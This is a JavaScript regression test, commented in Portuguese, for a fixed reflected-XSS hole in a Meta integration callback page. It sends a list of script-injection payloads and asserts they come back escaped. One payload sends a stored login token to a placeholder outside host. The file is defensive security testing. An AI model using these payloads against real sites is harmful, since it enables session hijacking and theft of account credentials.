// AUDITORIA DA PORTA DA META (Etapa 8 — segurança do caminho todo).
//
// O achado mais grave da auditoria. A tela de retorno da Meta é HTML montado no
// servidor (tem que ser: quem chega ali é o navegador, não a API), e ela colava
// direto dentro da página o que vinha no endereço:
//
//   /api/integrations/meta/callback?error_description=<script>...</script>
//
// Um link desses mandado para a Katy — WhatsApp, e-mail, qualquer lugar —
// executava o script NO ENDEREÇO DO SISTEMA DELA. É nesse endereço que o
// navegador guarda o crachá de quem está logado, então o link virava a conta
// inteira na mão de outra pessoa: clientes, contratos, financeiro e a Central,
// onde ficam as senhas de todos os clientes. Rota sem login, note-se.
//
// Reproduzido num servidor rodando antes de corrigir.
import { test, after } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const dir = mkdtempSync(join(tmpdir(), "pc-xss-"));
process.env.DB_PATH = join(dir, "test.db");
process.env.UPLOADS_DIR = join(dir, "uploads");
process.env.JWT_SECRET = "test-secret";

const express = (await import("express")).default;
const { default: integrationsRoutes, textoSeguro } = await import("../src/routes/integrations.js");

const app = express();
app.use(express.json());
app.use("/api/integrations", integrationsRoutes);
const srv = app.listen(0);
await new Promise((r) => srv.once("listening", r));
const B = `http://127.0.0.1:${srv.address().port}`;
after(() => srv.close());

const ATAQUES = [
  "<script>alert(1)</script>",
  "<img src=x onerror=alert(document.domain)>",
  '"><svg onload=alert(1)>',
  "</h2><script>fetch('//fora.example/'+localStorage.token)</script>",
  "<iframe src=javascript:alert(1)>",
];

for (const carga of ATAQUES) {
  test(`não executa script vindo pelo endereço: ${carga.slice(0, 32)}`, async () => {
    const url = `${B}/api/integrations/meta/callback?error_description=${encodeURIComponent(carga)}`;
    const html = await fetch(url).then((r) => r.text());
    assert.ok(!html.includes(carga), "a carga entrou crua no HTML");
    // A prova de verdade: dentro do <h2> — o único lugar onde a mensagem entra
    // — não pode sobrar NENHUM sinal de < ou > sem escapar. Enquanto forem
    // "&lt;" e "&gt;", o navegador desenha letras, não abre etiqueta nenhuma.
    // (Procurar por "onerror=alert" não serve: o texto escapado também contém
    // essas letras, e ali elas são inofensivas.)
    const dentroDoH2 = (html.match(/<h2[^>]*>([\s\S]*?)<\/h2>/) || [])[1] ?? "";
    assert.ok(!/[<>]/.test(dentroDoH2),
      `sobrou etiqueta aberta dentro do <h2>: ${JSON.stringify(dentroDoH2)}`);
    // E a página inteira continua tendo só as etiquetas que ela mesma escreve.
    const etiquetas = (html.match(/<\/?\w+/g) || []).map((t) => t.toLowerCase());
    const permitidas = new Set(["<html", "<body", "<div", "<h2", "</h2", "<p", "</p", "</div", "<script", "</script", "</body", "</html"]);
    for (const t of etiquetas) assert.ok(permitidas.has(t), `etiqueta estranha na página: ${t}`);
  });
}

test("a mensagem legítima continua aparecendo para a pessoa", async () => {
  const html = await fetch(`${B}/api/integrations/meta/callback?error_description=${encodeURIComponent("Permissão negada pelo usuário")}`)
    .then((r) => r.text());
  assert.match(html, /A Meta recusou: Permissão negada pelo usuário/);
});

test("acento e & não quebram a frase", async () => {
  const html = await fetch(`${B}/api/integrations/meta/callback?error_description=${encodeURIComponent("Erro de conexão & tempo esgotado")}`)
    .then((r) => r.text());
  assert.match(html, /Erro de conexão &amp; tempo esgotado/);
});

test("textoSeguro trata o que precisa e não inventa", () => {
  assert.equal(textoSeguro("<b>oi</b>"), "&lt;b&gt;oi&lt;/b&gt;");
  assert.equal(textoSeguro('a"b\'c&d'), "a&quot;b&#39;c&amp;d");
  assert.equal(textoSeguro("texto normal"), "texto normal");
  assert.equal(textoSeguro(null), "");
});
